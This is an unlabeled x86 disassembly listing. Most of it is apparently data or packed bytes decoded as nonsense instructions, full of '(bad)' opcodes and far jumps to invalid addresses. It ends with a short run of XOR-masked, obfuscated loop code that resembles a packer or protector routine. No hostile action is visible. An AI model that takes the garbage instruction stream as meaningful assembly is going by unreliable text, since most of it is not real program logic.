  4058da:	xor    ebp,DWORD PTR [ebx-0x36]
  4058dd:	cmp    esi,edi
  4058df:	dec    ecx
  4058e0:	das    
  4058e1:	cmp    BYTE PTR [edx+0x77],dh
  4058e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058e5:	fiadd  WORD PTR [ebx]
  4058e7:	daa    
  4058e8:	mov    WORD PTR [ebp-0x1627ee1],gs
  4058ee:	retf   0x1418
  4058f1:	mov    eax,ds:0xfeef890e
  4058f6:	dec    esi
  4058f7:	pop    ebp
  4058f8:	ret    0xe1b2
  4058fb:	ja     0x4058b6
  4058fd:	mov    edx,0xbebcd8eb
  405902:	divss  xmm0,DWORD PTR [ecx]
  405906:	add    eax,0xdacaddf6
  40590b:	inc    eax
  40590c:	gs jno 0x4058e0
  40590f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405910:	jp     0x405963
  405912:	cdq    
  405913:	mov    ds:0x63278e81,al
  405918:	and    eax,0x39538fc
  40591d:	and    DWORD PTR [ebx+0x3b7a7437],ebp
  405923:	fdivrp st(1),st
  405925:	dec    ecx
  405926:	mov    cl,0x38
  405928:	sbb    eax,0xab5038c9
  40592d:	or     bh,BYTE PTR [edi+edx*8]
  405930:	ds repz push ebp
  405933:	pop    ebx
  405934:	in     al,dx
  405935:	pop    es
  405936:	arpl   WORD PTR [ecx-0x14a4001],dx
  40593c:	push   0xffffff9d
  40593e:	dec    ebp
  40593f:	arpl   sp,sp
  405941:	addr16 inc ecx
  405943:	scas   al,BYTE PTR es:[edi]
  405944:	inc    eax
  405945:	imul   edx,DWORD PTR [ecx],0x3e
  405948:	sub    al,0x70
  40594b:	mov    DWORD PTR [esp+eiz*2+0x5],esp
  40594f:	js     0x405905
  405951:	mov    eax,ds:0x32c4e5a
  405956:	jae    0x4058eb
  405958:	push   ds
  405959:	adc    BYTE PTR [esi],cl
  40595b:	and    ebp,DWORD PTR [ecx+0x47ad7e0f]
  405961:	test   DWORD PTR [edx],ebx
  405963:	cwde   
  405964:	add    al,0xff
  405966:	aaa    
  405967:	stos   BYTE PTR es:[edi],al
  405968:	(bad)  
  405969:	imul   esp,DWORD PTR [esi-0x6254a4c7],0xc6b53a96
  405973:	push   esi
  405974:	sbb    bl,0x45
  405977:	inc    edi
  405978:	cmp    bh,BYTE PTR [edi+0x29]
  40597b:	xchg   edi,eax
  40597c:	cld    
  40597d:	jg     0x40593f
  40597f:	cmp    al,0xb
  405981:	arpl   WORD PTR [edi],ax
  405983:	int    0x1c
  405985:	dec    BYTE PTR [ebx]
  405987:	sbb    BYTE PTR [edi+0x6],0x8b
  40598b:	xchg   ebp,eax
  40598c:	mov    ecx,ebp
  40598e:	out    dx,eax
  40598f:	js     0x4059d8
  405991:	push   esp
  405992:	es clc 
  405994:	cs mov eax,0xed542aa4
  40599a:	mov    fs,WORD PTR [eax]
  40599c:	xlat   BYTE PTR ds:[ebx]
  40599d:	add    esp,ebp
  40599f:	dec    edx
  4059a0:	dec    ebx
  4059a1:	add    eax,0x7a61b28a
  4059a6:	test   BYTE PTR [eax],dh
  4059a8:	xchg   ecx,eax
  4059a9:	cmp    eax,0xa603537f
  4059ae:	js     0x4059b6
  4059b0:	loope  0x405a16
  4059b2:	call   0x43f1:0x6545a129
  4059b9:	mov    DWORD PTR [ebx-0x78],eax
  4059bc:	adc    eax,0x4a388fcb
  4059c1:	cld    
  4059c2:	or     BYTE PTR [edx+0x9],cl
  4059c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059c6:	gs sub eax,0x47b18ba0
  4059cc:	in     eax,0x7b
  4059ce:	inc    esp
  4059cf:	sbb    ecx,DWORD PTR [ecx]
  4059d1:	inc    esp
  4059d2:	cld    
  4059d3:	popf   
  4059d4:	arpl   WORD PTR [eax+0x65],si
  4059d7:	mov    ebp,0xb0244523
  4059dc:	ret    
  4059dd:	pop    es
  4059de:	mov    al,0x4e
  4059e0:	sub    eax,0x1a81ef91
  4059e5:	out    0x57,al
  4059e7:	dec    esi
  4059e8:	fucomi st,st(4)
  4059ea:	outs   dx,DWORD PTR ds:[esi]
  4059eb:	mov    ds:0x914d2450,al
  4059f0:	pop    eax
  4059f1:	ja     0x4059a0
  4059f3:	fucom  st(0)
  4059f5:	popw   es
  4059f7:	aam    0xae
  4059f9:	mov    bh,0x65
  4059fb:	cmp    al,BYTE PTR ds:0xa1982aae
  405a01:	push   cs
  405a02:	xchg   ebx,eax
  405a03:	lock loop 0x4059a3
  405a06:	ret    0x240c
  405a09:	stos   DWORD PTR es:[edi],eax
  405a0a:	in     al,dx
  405a0b:	loop   0x405a3d
  405a0d:	or     al,0x67
  405a0f:	and    dl,bl
  405a11:	pop    esi
  405a12:	push   ebp
  405a13:	pop    esp
  405a14:	(bad)  
  405a15:	dec    ebx
  405a16:	mov    ecx,DWORD PTR [esi-0x65]
  405a19:	inc    esi
  405a1a:	jp     0x4059d3
  405a1c:	sub    dh,BYTE PTR [esi-0x5]
  405a1f:	sbb    dh,BYTE PTR [edi+0x58266581]
  405a25:	leave  
  405a26:	push   ss
  405a27:	lods   eax,DWORD PTR ds:[esi]
  405a28:	outs   dx,DWORD PTR ds:[esi]
  405a29:	mov    ecx,0x382b4292
  405a2e:	jb     0x405a3e
  405a30:	and    edx,ebx
  405a32:	mov    ds:0xfb6a8436,eax
  405a37:	arpl   ax,di
  405a39:	data16 into 
  405a3b:	inc    ebp
  405a3c:	mov    eax,DWORD PTR [ebx+0x3fbd8fb7]
  405a42:	lods   eax,DWORD PTR ds:[esi]
  405a43:	(bad)  
  405a44:	cmp    al,0x2d
  405a46:	sub    ebx,ecx
  405a48:	stos   DWORD PTR es:[edi],eax
  405a49:	dec    edi
  405a4a:	dec    BYTE PTR [esi]
  405a4c:	ja     0x405a62
  405a4e:	out    dx,eax
  405a4f:	lds    esi,FWORD PTR [ebp+0x44]
  405a52:	jmp    0x55e74edf
  405a57:	mov    WORD PTR [esi-0x2c],cs
  405a5a:	popf   
  405a5b:	jg     0x4059f6
  405a5d:	aaa    
  405a5e:	push   eax
  405a5f:	paddsb mm5,QWORD PTR [esi]
  405a62:	mov    ebp,0x34bc957
  405a67:	mov    ah,0x2c
  405a69:	or     edx,DWORD PTR [ebx]
  405a6b:	jo     0x405a83
  405a6d:	jge    0x405aee
  405a6f:	inc    esp
  405a70:	add    al,0x0
  405a72:	dec    edx
  405a73:	sbb    DWORD PTR [ecx],edi
  405a75:	jmp    0x537334
  405a7a:	icebp  
  405a7b:	jmp    0xd241ff72
  405a80:	mov    ds:0xd5cc2402,eax
  405a85:	sar    bh,cl
  405a87:	repz fisttp DWORD PTR [eax]
  405a8a:	jmp    0xe029:0x72f1a462
  405a91:	stos   DWORD PTR es:[edi],eax
  405a92:	and    al,0x34
  405a94:	dec    ebp
  405a95:	mov    eax,ds:0xf12e3449
  405a9a:	inc    ecx
  405a9b:	jb     0x405afb
  405a9d:	into   
  405a9e:	mov    esp,edi
  405aa0:	push   ds
  405aa1:	xor    eax,0x5e727304
  405aa6:	mov    ebx,eax
  405aa8:	lock fiadd DWORD PTR [ecx]
  405aab:	shr    DWORD PTR [edi],cl
  405aad:	fnstcw WORD PTR [ebx-0xd]
  405ab0:	rcl    BYTE PTR [edx-0x42],cl
  405ab3:	icebp  
  405ab4:	inc    ebp
  405ab5:	fidiv  DWORD PTR [ebx-0x62]
  405ab8:	arpl   WORD PTR [eax+0x5dfcf2b6],dx
  405abe:	add    BYTE PTR [ebx],0x47
  405ac1:	dec    eax
  405ac2:	(bad)  
  405ac4:	jns    0x405a6a
  405ac6:	std    
  405ac7:	push   edx
  405ac8:	std    
  405ac9:	add    esi,esi
  405acb:	jnp    0x405aa9
  405acd:	imul   edx,DWORD PTR [eax+esi*1],0x1eba63d0
  405ad4:	inc    DWORD PTR [edx-0x4704d78b]
  405ada:	cmp    BYTE PTR [eax],dh
  405adc:	inc    ebp
  405add:	add    esp,DWORD PTR [ecx+0x69]
  405ae0:	push   edi
  405ae1:	cli    
  405ae2:	push   eax
  405ae3:	cmp    edi,ecx
  405ae5:	jb     0x405ad9
  405ae7:	sbb    eax,0x7bedc8a8
  405aec:	pop    ebx
  405aed:	es (bad) 
  405aef:	and    DWORD PTR [ecx+0x3a5d16b7],edx
  405af5:	dec    esp
  405af6:	sub    ebx,DWORD PTR ds:0xcfd0
  405afb:	out    0x5a,eax
  405afd:	aas    
  405afe:	fsub   DWORD PTR [ebx+0x45f8f2cd]
  405b04:	mov    bl,0xc3
  405b06:	and    dl,BYTE PTR [esi+0x27]
  405b09:	bound  eax,QWORD PTR [ebx+0x4365957e]
  405b0f:	cmp    eax,DWORD PTR [edi+0x339fbfd8]
  405b15:	imul   eax,esp,0x635b823c
  405b1b:	jbe    0x405b6b
  405b1d:	mov    al,ds:0xa0b3bc3e
  405b22:	sub    DWORD PTR [ebx+0x45dae382],ecx
  405b28:	cdq    
  405b29:	les    edx,FWORD PTR [edi+eiz*1+0x80a5f85]
  405b30:	aas    
  405b31:	jnp    0x405b2c
  405b33:	add    dl,BYTE PTR [eax]
  405b35:	test   BYTE PTR [eax],ch
  405b37:	or     cl,ah
  405b39:	jle    0x405bb8
  405b3b:	loop   0x405acd
  405b3d:	pop    esi
  405b3e:	sbb    dl,BYTE PTR [edi]
  405b40:	(bad)  ds:[edi]
  405b43:	and    BYTE PTR [edi-0x36],ah
  405b46:	hlt    
  405b47:	pop    es
  405b48:	aad    0x46
  405b4a:	jnp    0x405afc
  405b4c:	ja     0x405b1d
  405b4e:	pusha  
  405b4f:	push   ecx
  405b50:	(bad)  
  405b51:	shl    BYTE PTR [edi-0x5b],1
  405b54:	dec    esi
  405b55:	mov    ds:0x6aff7f33,al
  405b5a:	stc    
  405b5b:	xor    ebx,DWORD PTR ds:[eax-0x48]
  405b5f:	xchg   esi,eax
  405b60:	dec    eax
  405b61:	push   eax
  405b62:	push   ebx
  405b63:	xor    BYTE PTR [ecx+0x6],cl
  405b66:	cwde   
  405b67:	mov    eax,ds:0xd21bac3c
  405b6c:	mov    ch,0x45
  405b6e:	(bad)
  405b71:	lahf   
  405b72:	pop    ecx
  405b73:	enter  0x597c,0xdc
  405b77:	iret   
  405b78:	iret   
  405b79:	stos   DWORD PTR es:[edi],eax
  405b7a:	xor    al,0xb4
  405b7c:	push   esi
  405b7d:	sub    cl,dl
  405b7f:	(bad)  
  405b80:	loopne 0x405b74
  405b82:	nop
  405b83:	and    ecx,DWORD PTR [eax+esi*4-0x26]
  405b87:	jmp    0x405b0c
  405b89:	mov    dh,0x7e
  405b8b:	xchg   edi,eax
  405b8c:	sub    ebp,DWORD PTR [eax+ebx*1]
  405b8f:	jge    0x405b4a
  405b91:	stos   DWORD PTR es:[edi],eax
  405b92:	sbb    eax,0x2fb4cfcd
  405b97:	jne    0x405b7c
  405b99:	add    bl,cl
  405b9b:	mov    ch,BYTE PTR [esi-0x2a868c90]
  405ba1:	clc    
  405ba2:	pop    ss
  405ba3:	or     bh,0xc6
  405ba6:	xchg   edx,eax
  405ba7:	sbb    DWORD PTR [edx-0x5],ebp
  405baa:	add    BYTE PTR [ebx+edx*1+0x7c7a4ca9],ah
  405bb1:	adc    bh,BYTE PTR [edx+0x445d4d52]
  405bb7:	mov    bh,0xc3
  405bb9:	pop    esi
  405bba:	and    ah,BYTE PTR [esp+edi*2]
  405bbd:	pop    edi
  405bbe:	push   edi
  405bbf:	sbb    al,0x4b
  405bc1:	and    esi,DWORD PTR [ebp-0x7c]
  405bc4:	cmp    bh,BYTE PTR [ebx+0x53fb876e]
  405bca:	nop
  405bcb:	ret    0x2909
  405bce:	(bad)  
  405bcf:	mov    edx,0x158b4883
  405bd4:	push   edx
  405bd5:	mov    eax,0xd8125ce3
  405bda:	repnz xchg bl,bl
  405bdd:	stos   BYTE PTR es:[edi],al
  405bde:	mov    al,ds:0xcc4dbe6
  405be3:	int3   
  405be4:	sub    BYTE PTR [ebx-0x4123d953],dl
  405bea:	inc    esp
  405beb:	sar    BYTE PTR [ebx],1
  405bed:	fwait
  405bee:	out    0xb9,eax
  405bf0:	outs   dx,BYTE PTR ds:[esi]
  405bf1:	lahf   
  405bf2:	mov    ds:0xde7ccb94,al
  405bf7:	push   edx
  405bf8:	inc    edx
  405bf9:	xor    dh,dh
  405bfb:	mov    dh,0x5c
  405bfd:	mov    al,0x94
  405bff:	cmp    edi,DWORD PTR [edx]
  405c01:	ds gs imul edx,ebp,0xeb7e8ce3
  405c09:	ins    DWORD PTR es:[edi],dx
  405c0a:	jmp    0x405bdb
  405c0c:	rol    DWORD PTR [ecx-0x7951e812],cl
  405c12:	mov    ch,BYTE PTR [ecx+0x52]
  405c15:	loopne 0x405c8f
  405c17:	and    eax,0xb305f8e3
  405c1c:	push   0xb4cf4c2
  405c21:	pop    eax
  405c22:	out    0x3,eax
  405c24:	mov    ah,0xb5
  405c26:	or     edx,edi
  405c28:	int    0x44
  405c2a:	cs popa 
  405c2c:	nop
  405c2d:	fdivr  st,st(2)
  405c2f:	(bad)  
  405c30:	dec    ebp
  405c31:	jp     0x405c3a
  405c33:	ret    0xe893
  405c36:	or     eax,DWORD PTR [ebp+0x5f8da659]
  405c3c:	ins    BYTE PTR es:[edi],dx
  405c3d:	jns    0x405c30
  405c3f:	nop
  405c40:	adc    al,0x6d
  405c42:	dec    eax
  405c43:	xchg   esi,eax
  405c44:	ret    0x77b2
  405c47:	inc    edx
  405c48:	mov    esi,0x4ffb0213
  405c4d:	pop    eax
  405c4e:	hlt    
  405c4f:	and    al,0x61
  405c51:	loop   0x405bfe
  405c53:	mov    al,ds:0x446cfd06
  405c58:	leave  
  405c59:	sbb    edi,DWORD PTR [edi+0xe76fc24]
  405c5f:	xchg   ebp,eax
  405c60:	fild   DWORD PTR [esp+ecx*1]
  405c63:	mov    ecx,0xf4e35179
  405c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c69:	jp     0x405cba
  405c6b:	adc    BYTE PTR [eax],dl
  405c6d:	(bad)  
  405c6e:	fisub  WORD PTR [ecx]
  405c70:	pop    ecx
  405c71:	and    al,al
  405c73:	cld    
  405c74:	aas    
  405c75:	mov    ebx,0x41356373
  405c7a:	pop    gs
  405c7c:	pusha  
  405c7d:	push   eax
  405c7e:	and    dh,ch
  405c80:	dec    ebp
  405c81:	(bad)  
  405c82:	jmp    0xe5dc65b5
  405c87:	xor    bh,BYTE PTR [ebx+0x3]
  405c8a:	adc    eax,0x4ffec448
  405c8f:	call   0x53b1:0x5452ad3c
  405c96:	gs std 
  405c98:	repnz jmp 0x4909:0x9b505dee
  405ca0:	push   cs
  405ca1:	imul   ebp,eax,0x25dc523f
  405ca7:	dec    esi
  405ca8:	mov    ds:0x284dcb59,eax
  405cad:	mov    BYTE PTR [ecx+ebx*4+0x3a],dl
  405cb1:	dec    esp
  405cb2:	mov    ah,0xed
  405cb4:	push   ebp
  405cb5:	icebp  
  405cb6:	inc    ebp
  405cb7:	sti    
  405cb8:	add    BYTE PTR [edi+0x29],bh
  405cbb:	jns    0x405cf3
  405cbd:	add    DWORD PTR [edx-0x4b],ebx
  405cc0:	xor    bh,BYTE PTR [eax+0x2acf542b]
  405cc6:	sti    
  405cc7:	ins    DWORD PTR es:[edi],dx
  405cc8:	jecxz  0x405d1a
  405cca:	psrld  mm2,mm5
  405ccd:	push   ecx
  405cce:	xor    ebx,ebx
  405cd0:	rcr    esi,1
  405cd2:	(bad)  
  405cd4:	fmul   DWORD PTR [eax+0x5d]
  405cd7:	daa    
  405cd8:	dec    esp
  405cd9:	mov    eax,ds:0x54eaf21a
  405cde:	fdivr  DWORD PTR [esi]
  405ce0:	add    al,0xc2
  405ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce3:	cmp    eax,0xd9c14f5b
  405ce8:	jo     0x405cb1
  405cea:	imul   DWORD PTR [eax-0x1f]
  405ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cee:	popa   
  405cef:	outs   dx,BYTE PTR ds:[esi]
  405cf0:	daa    
  405cf1:	sub    al,BYTE PTR [eax]
  405cf3:	test   DWORD PTR [edx+0x2],esp
  405cf6:	std    
  405cf7:	out    dx,al
  405cf8:	push   ss
  405cf9:	cmovle esi,edi
  405cfc:	pop    ebp
  405cfd:	scas   eax,DWORD PTR es:[edi]
  405cfe:	xchg   edx,eax
  405cff:	ror    DWORD PTR [eax+0x49],cl
  405d02:	mov    ebx,0xc60eb1f2
  405d07:	out    0x67,eax
  405d09:	(bad)  
  405d0a:	jae    0x405d1c
  405d0c:	adc    eax,0xc4f8d112
  405d11:	je     0x405ca1
  405d13:	fs mov edx,0xb002c005
  405d19:	ror    DWORD PTR [eax],1
  405d1b:	xor    eax,0x75c207bc
  405d20:	repz sbb ch,ah
  405d23:	xor    eax,0x4ed68ff2
  405d28:	neg    DWORD PTR [eax-0x41]
  405d2b:	repnz add bh,BYTE PTR [ecx+0x17b0e0f9]
  405d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d33:	mov    bl,0x1e
  405d35:	pop    es
  405d36:	inc    edi
  405d37:	addr16 ret 0x11ce
  405d3b:	push   0xb
  405d3d:	jno    0x405d86
  405d3f:	cwde   
  405d40:	pusha  
  405d41:	lds    edx,FWORD PTR [eax+0x7759f7c7]
  405d47:	je     0x405d8c
  405d49:	sbb    al,0xa4
  405d4b:	inc    DWORD PTR [ecx]
  405d4d:	call   0xf291:0x30ff0d24
  405d54:	(bad)  
  405d55:	(bad)  
  405d56:	fstp   QWORD PTR [eax-0x3b0bee5f]
  405d5c:	enter  0xf83c,0xbd
  405d60:	lahf   
  405d61:	(bad)  
  405d62:	sar    DWORD PTR [ebx-0x7d],cl
  405d65:	adc    DWORD PTR [ebx-0x6d138076],esp
  405d6b:	mov    ds:0x35c6edbc,al
  405d70:	js     0x405cf6
  405d72:	xor    DWORD PTR [edi+0x3b],0xda5dfbf7
  405d79:	ret    
  405d7a:	xor    esp,ebx
  405d7c:	in     al,dx
  405d7d:	push   0x33e2f2a8
  405d82:	mov    BYTE PTR [edi],dl
  405d84:	jnp    0x405d41
  405d86:	je     0x405d0a
  405d88:	push   ecx
  405d89:	mov    bl,0x46
  405d8b:	jg     0x405da9
  405d8d:	pop    edx
  405d8e:	daa    
  405d8f:	pop    ds
  405d90:	pop    eax
  405d91:	retf   
  405d92:	outs   dx,DWORD PTR ds:[esi]
  405d93:	pop    ebp
  405d94:	fcom   QWORD PTR [ebp-0x53]
  405d97:	jle    0x405d46
  405d99:	mov    esp,0xe286ec03
  405d9e:	jecxz  0x405de3
  405da0:	pusha  
  405da1:	je     0x405d8f
  405da3:	lahf   
  405da4:	xor    DWORD PTR [esi-0x75b47ae7],esi
  405daa:	shr    BYTE PTR [esi+0x1fa7afa],cl
  405db0:	les    esp,FWORD PTR [esi-0x5d515856]
  405db6:	and    DWORD PTR [edi],0x3e745eb6
  405dbc:	shl    BYTE PTR [ebx],0x13
  405dbf:	(bad)  
  405dc1:	mov    edx,0xc55dac50
  405dc6:	aad    0x5
  405dc8:	outs   dx,DWORD PTR ds:[esi]
  405dc9:	xchg   ebp,edi
  405dcb:	repnz sar BYTE PTR [edx],cl
  405dce:	jmp    0xa6b:0xa5be7522
  405dd5:	sbb    eax,0x3c7ea674
  405dda:	fcmovnb st,st(7)
  405ddc:	iret   
  405ddd:	stc    
  405dde:	fwait
  405ddf:	cmp    cl,BYTE PTR [ecx-0x39]
  405de2:	stc    
  405de3:	inc    ebp
  405de4:	hlt    
  405de5:	int    0xf8
  405de7:	inc    ecx
  405de8:	lods   eax,DWORD PTR ds:[esi]
  405de9:	inc    edi
  405dea:	lahf   
  405deb:	test   BYTE PTR [ebx-0x73],ah
  405dee:	mov    al,ds:0xfd0f4cf4
  405df3:	xlat   BYTE PTR ds:[ebx]
  405df4:	mov    edi,0x59840677
  405df9:	aaa    
  405dfa:	fimul  DWORD PTR [esi+0x75]
  405dfd:	xlat   BYTE PTR ds:[ebx]
  405dfe:	mov    eax,0x72a91fa3
  405e03:	or     bl,bl
  405e05:	mov    ?,WORD PTR [edi-0x3136abad]
  405e0b:	jb     0x405e05
  405e0d:	mov    cl,0x74
  405e0f:	das    
  405e10:	sahf   
  405e11:	lods   al,BYTE PTR ds:[esi]
  405e12:	adc    esi,DWORD PTR [edx]
  405e14:	fidiv  DWORD PTR [esi]
  405e16:	or     DWORD PTR cs:[esi+0x6e8f09cd],esi
  405e1d:	test   DWORD PTR ds:0x40c4599f,0x88092620
  405e27:	sub    eax,0xde15093
  405e2c:	push   0x66681280
  405e31:	pop    ebx
  405e32:	iret   
  405e33:	ffree  st(5)
  405e35:	push   ds
  405e36:	adc    bl,dl
  405e38:	dec    esi
  405e39:	mov    dl,BYTE PTR [eax-0x534d63b4]
  405e3f:	sbb    BYTE PTR [ecx],ah
  405e41:	sub    BYTE PTR [ebx+0x22],dl
  405e44:	std    
  405e45:	push   esi
  405e46:	mov    cl,0x4d
  405e48:	ds xchg ebp,eax
  405e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e4b:	and    BYTE PTR [eax-0x76],al
  405e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e4f:	(bad)  
  405e50:	push   0x723b3acf
  405e55:	stos   BYTE PTR es:[edi],al
  405e56:	inc    ebp
  405e57:	mov    BYTE PTR [edx-0xb6ae2b2],ah
  405e5d:	sub    eax,0xe7d21795
  405e62:	adc    al,0x22
  405e64:	outs   dx,DWORD PTR ds:[esi]
  405e65:	inc    edi
  405e66:	xor    bh,BYTE PTR [esi]
  405e68:	adc    ecx,ecx
  405e6a:	pop    es
  405e6b:	sbb    eax,edx
  405e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e6e:	push   ds
  405e6f:	outs   dx,DWORD PTR ds:[esi]
  405e70:	sbb    DWORD PTR [eax-0x1],edi
  405e73:	lock adc BYTE PTR [edx+0x47c2cb66],bl
  405e7a:	xchg   edx,eax
  405e7b:	jge    0x405e32
  405e7d:	ds jmp 0x62ad:0x443a0b5b
  405e85:	lods   eax,DWORD PTR ds:[esi]
  405e86:	push   ds
  405e87:	and    DWORD PTR [edi],ecx
  405e89:	ss retf 
  405e8b:	xchg   edx,eax
  405e8c:	cmp    ecx,ecx
  405e8e:	stos   BYTE PTR es:[edi],al
  405e8f:	loop   0x405ec8
  405e91:	test   DWORD PTR [ecx+0xa],ebp
  405e94:	mov    esi,0xc22c9a55
  405e99:	mov    bh,0x8f
  405e9b:	sahf   
  405e9c:	ja     0x405eb5
  405e9e:	add    ebx,edx
  405ea0:	iret   
  405ea1:	loope  0x405e39
  405ea3:	mov    WORD PTR ss:[edi+0x2a],ds
  405ea7:	adc    ah,BYTE PTR [ecx]
  405ea9:	adc    bh,bl
  405eab:	cld    
  405eac:	jg     0x405e69
  405eae:	fisubr WORD PTR [esi+esi*8-0x677842]
  405eb5:	mov    bl,0xfd
  405eb7:	and    eax,0x84ca9649
  405ebc:	xlat   BYTE PTR ds:[ebx]
  405ebd:	daa    
  405ebe:	pop    esp
  405ebf:	dec    ebx
  405ec0:	fcmovnu st,st(6)
  405ec2:	xlat   BYTE PTR ds:[ebx]
  405ec3:	mov    cl,0x1
  405ec5:	cli    
  405ec6:	xchg   esp,eax
  405ec7:	das    
  405ec8:	in     eax,dx
  405ec9:	sbb    eax,DWORD PTR [ebx]
  405ecb:	push   0x8639b782
  405ed0:	xor    edi,ebx
  405ed2:	jl     0x405f04
  405ed4:	xchg   ebx,eax
  405ed5:	jne    0x405ef5
  405ed7:	outs   dx,BYTE PTR ds:[esi]
  405ed8:	push   ebp
  405ed9:	pop    es
  405eda:	mov    bh,BYTE PTR [esi-0x71]
  405edd:	mov    al,ds:0x7ddcb682
  405ee2:	add    eax,0x4e4bd7d0
  405ee7:	jmp    0x2af38807
  405eec:	mov    bh,0x1
  405eee:	pop    edi
  405eef:	xlat   BYTE PTR ds:[ebx]
  405ef0:	jmp    DWORD PTR [ebx]
  405ef2:	mov    ds:0xa9d89298,eax
  405ef7:	xchg   edi,eax
  405ef8:	jb     0x405f08
  405efa:	pop    ebp
  405efb:	cmova  ebx,esi
  405efe:	pop    ecx
  405eff:	dec    edi
  405f00:	and    BYTE PTR [edi+0x60],ch
  405f03:	add    dh,BYTE PTR ds:0x30622271
  405f09:	mov    dl,0x96
  405f0b:	test   eax,0xdf021f9e
  405f10:	xor    eax,0xf7dc961e
  405f15:	push   es
  405f16:	xchg   esi,eax
  405f17:	stos   BYTE PTR es:[edi],al
  405f18:	and    eax,0x9a24e43c
  405f1d:	dec    edx
  405f1e:	pop    eax
  405f1f:	mov    DWORD PTR [ebx],esi
  405f21:	cmp    dh,BYTE PTR [ebx]
  405f23:	popf   
  405f24:	jae    0x405ec6
  405f26:	xchg   ecx,eax
  405f27:	jno    0x405f84
  405f29:	and    esi,DWORD PTR [eax+ebp*1]
  405f2c:	or     BYTE PTR [eax+0x558b47ae],0x8
  405f33:	xor    edx,eax
  405f35:	inc    ecx
  405f36:	inc    DWORD PTR [ebp-0x18]
  405f39:	add    edx,esi
  405f3b:	cmp    ecx,edx
  405f3d:	jb     0x403b83
  405f43:	jmp    0x405f8d
  405f48:	mov    ecx,DWORD PTR [ebp-0xc]
  405f4b:	mov    DWORD PTR [ebp+0x8],ecx
  405f4e:	jmp    0x405f80
  405f53:	mov    ecx,DWORD PTR [ebp+0x8]
  405f56:	mov    edx,DWORD PTR [ebp-0x8]
  405f59:	xor    ecx,eax
  405f5b:	xor    edx,eax
  405f5d:	sub    ecx,edx
  405f5f:	sub    ecx,esi
  405f61:	xor    ecx,eax
  405f63:	mov    DWORD PTR [ebp+0x8],ecx
  405f66:	mov    ecx,DWORD PTR [ebp+0x8]
  405f69:	mov    edx,DWORD PTR [ebp+0x8]
  405f6c:	imul   edx,edx,0x5708f5
  405f72:	xor    ecx,eax
  405f74:	add    ecx,esi
  405f76:	lea    ecx,[ebp+ecx*4-0x64]
  405f7a:	mov    edi,DWORD PTR [ecx]
  405f7c:	add    edx,edi
  405f7e:	mov    DWORD PTR [ecx],edx
  405f80:	mov    ecx,DWORD PTR [ebp+0x8]
  405f83:	xor    ecx,eax
  405f85:	add    ecx,esi
  405f87:	jne    0x405f53
  405f8d:	mov    ecx,DWORD PTR [ebp-0xc]
  405f90:	mov    DWORD PTR [ebp+0x8],ecx
  405f93:	jmp    0x405fc5
  405f98:	mov    ecx,DWORD PTR [ebp+0x8]
  405f9b:	mov    edx,DWORD PTR [ebp-0x8]
  405f9e:	xor    ecx,eax
  405fa0:	xor    edx,eax
  405fa2:	sub    ecx,edx
  405fa4:	sub    ecx,esi
  405fa6:	xor    ecx,eax
  405fa8:	mov    DWORD PTR [ebp+0x8],ecx
  405fab:	mov    ecx,DWORD PTR [ebp+0x8]
  405fae:	mov    edx,DWORD PTR [ebp+0x8]
  405fb1:	imul   edx,edx,0x5708f5
  405fb7:	xor    ecx,eax
  405fb9:	add    ecx,esi
  405fbb:	lea    ecx,[ebp+ecx*4-0x64]
  405fbf:	mov    edi,DWORD PTR [ecx]
  405fc1:	add    edx,edi
  405fc3:	mov    DWORD PTR [ecx],edx
  405fc5:	mov    ecx,DWORD PTR [ebp+0x8]
  405fc8:	xor    ecx,eax
  405fca:	add    ecx,esi
  405fcc:	jne    0x405f98
  405fd2:	mov    ecx,DWORD PTR [ebp-0x8]
  405fd5:	mov    edx,DWORD PTR [ebp-0x20]
  405fd8:	xor    ecx,eax
  405fda:	lea    ecx,[ecx+edx*1+0x3272db]
  405fe1:	mov    DWORD PTR [ebp-0x20],ecx
  405fe4:	inc    DWORD PTR [ebp+0xc]
  405fe7:	mov    ecx,DWORD PTR [ebp-0x1c]
  405fea:	xor    ecx,eax
  405fec:	add    ecx,esi
  405fee:	jne    0x401627
  405ff4:	jmp    0x40607d
  405ff9:	mov    ecx,DWORD PTR [ebp-0xc]
  405ffc:	mov    DWORD PTR [ebp+0x8],ecx
  405fff:	jmp    0x406031
  406004:	mov    ecx,DWORD PTR [ebp+0x8]
  406007:	mov    edx,DWORD PTR [ebp-0x8]
  40600a:	xor    ecx,eax
  40600c:	xor    edx,eax
  40600e:	sub    ecx,edx
  406010:	sub    ecx,esi
  406012:	xor    ecx,eax
  406014:	mov    DWORD PTR [ebp+0x8],ecx
  406017:	mov    ecx,DWORD PTR [ebp+0x8]
  40601a:	mov    edx,DWORD PTR [ebp+0x8]
  40601d:	imul   edx,edx,0x5708f5
  406023:	xor    ecx,eax
  406025:	add    ecx,esi
  406027:	lea    ecx,[ebp+ecx*4-0x64]
  40602b:	mov    edi,DWORD PTR [ecx]
  40602d:	add    edx,edi
  40602f:	mov    DWORD PTR [ecx],edx
  406031:	mov    ecx,DWORD PTR [ebp+0x8]
  406034:	xor    ecx,eax
  406036:	add    ecx,esi
  406038:	jne    0x406004
  40603e:	jmp    0x406089
  406043:	mov    ecx,DWORD PTR [ebp+0x8]
  406046:	mov    edx,DWORD PTR [ebp-0x8]
  406049:	xor    ecx,eax
  40604b:	xor    edx,eax
  40604d:	sub    ecx,edx
  40604f:	sub    ecx,esi
  406051:	xor    ecx,eax
  406053:	mov    DWORD PTR [ebp+0x8],ecx
  406056:	mov    ecx,DWORD PTR [ebp+0x8]
  406059:	mov    edx,DWORD PTR [ebp+0x8]
  40605c:	xor    ecx,eax
  40605e:	imul   edx,edx,0x5708f5
  406064:	add    ecx,esi
  406066:	lea    ecx,[ebp+ecx*4-0x64]
  40606a:	mov    edi,DWORD PTR [ecx]
  40606c:	add    edx,edi
  40606e:	mov    DWORD PTR [ecx],edx
  406070:	mov    ecx,DWORD PTR [ebp+0x8]
  406073:	xor    ecx,eax
